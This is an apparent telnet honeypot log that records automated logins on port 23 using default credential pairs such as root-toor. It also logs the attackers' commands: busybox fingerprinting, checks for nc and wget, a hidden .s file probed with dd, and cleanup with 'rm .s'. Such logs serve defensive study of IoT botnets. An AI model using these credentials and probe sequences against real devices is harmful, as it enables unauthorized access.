+2017-02-25 19:32:55,935 - __main__ - INFO - 178.223.16.4:58683: 'rm .s; exit'
+2017-02-25 19:32:56,055 - __main__ - INFO - Lost connection to 178.223.16.4:58683
+2017-02-25 19:33:02,699 - __main__ - INFO - 104.7.14.91:60534: 'cat /proc/mounts; /bin/busybox FHDVD'
+2017-02-25 19:33:05,143 - __main__ - INFO - 104.7.14.91:60534: 'ls'
+2017-02-25 19:33:39,236 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:33:41,351 - __main__ - INFO - Opened connection to 104.7.14.91:60536
+2017-02-25 19:33:43,849 - __main__ - INFO - 104.7.14.91:60536 logged in as root-toor
+2017-02-25 19:33:54,806 - __main__ - INFO - 104.7.14.91:60536: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox ATLQX'
+2017-02-25 19:34:01,865 - __main__ - INFO - 104.7.14.91:60536: 'nc; wget; /bin/busybox ATLQX'
+2017-02-25 19:34:24,151 - __main__ - INFO - 104.7.14.91:60536: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:34:29,815 - __main__ - INFO - 104.7.14.91:60536: 'sh'
+2017-02-25 19:34:38,271 - __main__ - INFO - 104.7.14.91:60536: 'rm .s;exit'
+2017-02-25 19:34:38,446 - __main__ - INFO - Lost connection to 104.7.14.91:60536
+2017-02-25 19:34:54,014 - __main__ - INFO - Opened connection to 104.7.14.91:60544
+2017-02-25 19:34:56,444 - __main__ - INFO - 104.7.14.91:60544 logged in as exit-quit
+2017-02-25 19:34:59,192 - __main__ - INFO - 104.7.14.91:60544: 'quit'
+2017-02-25 19:34:59,276 - __main__ - INFO - Lost connection to 104.7.14.91:60544
+2017-02-25 19:35:25,995 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:36:30,958 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:36:49,668 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:38:47,871 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:43:12,718 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:43:18,378 - __main__ - INFO - Opened connection to 104.7.14.91:60788
+2017-02-25 19:43:21,134 - __main__ - INFO - 104.7.14.91:60788 logged in as root-toor
+2017-02-25 19:43:34,235 - __main__ - INFO - 104.7.14.91:60788: 'enable'
+2017-02-25 19:43:40,249 - __main__ - INFO - 104.7.14.91:60788: 'shell'
+2017-02-25 19:43:55,804 - __main__ - INFO - 104.7.14.91:60788: 'cat /proc/mounts'
+2017-02-25 19:44:02,559 - __main__ - INFO - 104.7.14.91:60788: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox ATLQX'
+2017-02-25 19:44:33,114 - __main__ - INFO - 104.7.14.91:60788: 'nc; wget; /bin/busybox ATLQX'
+2017-02-25 19:44:39,132 - __main__ - INFO - 104.7.14.91:60788: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:44:44,991 - __main__ - INFO - 104.7.14.91:60788: 'exit'
+2017-02-25 19:44:45,091 - __main__ - INFO - Lost connection to 104.7.14.91:60788
+2017-02-25 19:45:40,327 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:45:51,485 - __main__ - INFO - Opened connection to 104.7.14.91:60792
+2017-02-25 19:45:53,184 - __main__ - INFO - 104.7.14.91:60792 logged in as toor-toor
+2017-02-25 19:46:00,499 - __main__ - INFO - 104.7.14.91:60792: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:46:21,685 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:46:23,371 - __main__ - INFO - Opened connection to 104.7.14.91:60794
+2017-02-25 19:46:26,367 - __main__ - INFO - 104.7.14.91:60794 logged in as toor-root
+2017-02-25 19:46:31,950 - __main__ - INFO - 104.7.14.91:60794: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:46:41,919 - __main__ - INFO - 104.7.14.91:60794: 'exit'
+2017-02-25 19:46:42,029 - __main__ - INFO - Lost connection to 104.7.14.91:60794
+2017-02-25 19:49:14,780 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:49:17,929 - __main__ - INFO - Opened connection to 104.7.14.91:60808
+2017-02-25 19:49:19,793 - __main__ - INFO - 104.7.14.91:60808 logged in as root-toor
+2017-02-25 19:49:20,870 - __main__ - INFO - 104.7.14.91:60808: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:49:35,378 - __main__ - INFO - 104.7.14.91:60808: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox ATLQX'
+2017-02-25 19:50:05,412 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:50:07,150 - __main__ - INFO - Opened connection to 104.7.14.91:60812
+2017-02-25 19:50:10,319 - __main__ - INFO - 104.7.14.91:60812 logged in as root-toor
+2017-02-25 19:50:11,759 - __main__ - INFO - 104.7.14.91:60812: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox ATLQX'
+2017-02-25 19:50:16,362 - __main__ - INFO - 104.7.14.91:60812: 'ls'
+2017-02-25 19:50:18,680 - __main__ - INFO - 104.7.14.91:60812: 'exit'
+2017-02-25 19:50:18,761 - __main__ - INFO - Lost connection to 104.7.14.91:60812
